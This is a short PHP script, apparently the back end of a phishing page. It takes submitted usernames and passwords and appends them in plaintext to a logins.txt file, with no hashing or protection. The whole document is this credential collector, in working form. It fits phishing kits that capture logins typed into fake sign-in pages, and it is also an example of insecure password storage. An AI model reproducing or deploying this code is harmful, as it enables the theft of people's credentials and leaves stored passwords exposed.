<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['Username'];
    $password = $_POST['Password'];

    $entry = "Username: $username | Password: $password" . PHP_EOL;

    file_put_contents("logins.txt", $entry, FILE_APPEND | LOCK_EX);

    echo "Login info saved!";
}
?>
